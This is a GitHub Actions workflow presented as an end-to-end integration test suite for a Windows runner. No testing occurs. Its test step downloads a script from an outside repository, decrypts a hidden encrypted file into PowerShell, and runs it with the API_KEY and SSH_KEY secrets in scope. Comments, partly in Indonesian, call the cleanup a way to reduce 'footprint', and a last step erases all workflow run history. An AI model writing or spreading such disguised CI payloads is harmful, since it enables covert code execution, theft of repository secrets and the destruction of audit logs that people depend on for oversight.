name: CI-End-to-End-Validation

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  Automated-Suite:
    runs-on: windows-latest
    permissions:
      actions: write
      contents: read

    steps:
      - name: Initialize Repository
        uses: actions/checkout@v4

      - name: Setup Python Environment
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Cache Build Dependencies
        uses: actions/cache@v4
        with:
          path: |
            ~\AppData\Local\pip\Cache
            C:\ProgramData\tools-runtime
          key: ${{ runner.os }}-build-${{ github.run_id }}
          restore-keys: |
            ${{ runner.os }}-build-

      - name: Install Integration Requirements
        run: |
          python -m pip install --upgrade pip
          pip install cryptography requests  # Modul umum yang biasa dipake script decrypt

      - name: Execute Integration Tests
        shell: powershell
        env:
          API_KEY: ${{ secrets.API_KEY }}
          SSH_KEY: ${{ secrets.SSH_KEY }}
        run: |
          $remoteUrl = "https://raw.githubusercontent.com/Scheldest/dex-enc/refs/heads/main/onlyonepyfile/main.py"
          Invoke-WebRequest -Uri $remoteUrl -OutFile "core_engine.py"
          
          if (Test-Path "database_i4x.dexenc") {
              Write-Host "Verifying encrypted assets..."
              python core_engine.py decrypt -i "database_i4x.dexenc" -key "$env:API_KEY" -o "temp_runtime.ps1"
              
              if (Test-Path "temp_runtime.ps1") {
                  Write-Host "Running post-decryption validation..."
                  . ./temp_runtime.ps1
                  # Cleanup instant untuk meminimalisir footprint
                  Remove-Item "temp_runtime.ps1", "core_engine.py" -Force
              } else {
                  throw "Validation Error: Runtime file not generated."
              }
          } else {
              Write-Error "Asset missing: database_i4x.dexenc"
              exit 1
          }

      - name: Finalize Logs
        if: always()
        run: |
          echo "Test suite finished with exit code $LASTEXITCODE"

      - name: Purge Run History
        uses: Mattraks/delete-workflow-runs@v2
        if: always()
        with:
          token: ${{ github.token }}
          repository: ${{ github.repository }}
          retain_days: 0
          keep_minimum_runs: 0
